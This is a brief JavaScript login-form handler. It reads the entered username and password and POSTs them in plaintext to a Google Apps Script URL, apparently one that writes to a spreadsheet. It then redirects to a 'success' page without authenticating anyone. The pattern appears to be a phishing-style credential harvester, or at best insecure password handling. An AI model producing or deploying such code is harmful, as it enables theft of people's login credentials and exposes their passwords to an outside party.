document
  .getElementById("loginForm")
  .addEventListener("submit", async function(e){

    e.preventDefault();

    const username =
      document.getElementById("username").value;

    const password =
      document.getElementById("password").value;

    console.log("Sending to Sheets...");

    await fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
      method: "POST",
      body: JSON.stringify({
        username,
        password
      })
    });

    window.location.href = "success.html";
});


